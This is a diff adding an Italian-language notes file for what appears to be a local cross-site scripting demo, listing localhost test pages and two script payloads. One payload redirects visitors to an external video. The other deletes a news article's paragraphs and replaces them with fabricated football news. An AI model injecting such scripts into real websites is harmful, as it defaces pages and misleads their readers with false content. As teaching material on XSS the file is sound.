@@ -1,0 +1,40 @@
+
+Link per testare gli attacchi:
+ http://localhost:8080/esempio_banale/saluto.php
+ http://localhost:8080/esempio_politico1/index.php
+
+
+Per reindirizzare ad un sito esterno (1)
+
+<script>
+    window.location.href =
+    "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+</script>
+
+
+Per modificare l'articolo (2)
+
+<script>
+    
+    const articleDiv = document.querySelector('.article');
+
+    if (articleDiv) {
+        // tolgo tutti i paragrafi esistenti all'interno dell'articolo
+            let paragraphs = articleDiv.querySelectorAll('p');
+            paragraphs.forEach(p => p.remove());
+
+        // aggingo nuovi paragrafi 
+            const newParagraph1 = document.createElement('p');
+            newParagraph1.innerHTML = '<i>Aggiornamento Importante:</i> Hanno litigato! L\'America ha deciso di proibire il Napoli!';
+            articleDiv.appendChild(newParagraph1);
+
+            const newParagraph2 = document.createElement('p');
+            newParagraph2.textContent = 'Il Napoli ha perso lo scudetto a tavolino, la festa è finita. 😭';
+            articleDiv.appendChild(newParagraph2);
+
+            const newParagraph3 = document.createElement('p');
+            newParagraph3.textContent = 'Queste informazioni sono sicuramente legittime!';
+            articleDiv.appendChild(newParagraph3);
+    }
+</script>
+
